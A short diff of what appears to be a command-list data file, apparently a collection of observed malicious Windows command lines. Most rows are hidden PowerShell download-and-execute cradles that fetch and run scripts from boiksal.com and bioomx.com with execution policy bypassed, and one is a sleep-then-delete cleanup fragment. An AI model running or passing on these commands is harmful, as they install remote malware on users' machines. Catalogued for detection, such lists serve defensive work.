@@ -1,4 +1,3 @@
-"command"
 ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -w h -ep b -c "iex (iwr boiksal.com/upd -useb).Content""
 "powershell Start-Sleep -Seconds 3; Remove-Item -Path"
 ""C:\Windows\system32\cmd.exe" /c start /min powershell -w hidden -c "$p=$env:APPDATA+'\a\f.ps1'; mkdir (Split-Path $p) -Force; ni (Split-Path $p)-ea 0|Out-Null; iwr http://bioomx.com/upd -UseBasicPar -o $p; & powershell -w hidden -ep bypass -f $p""
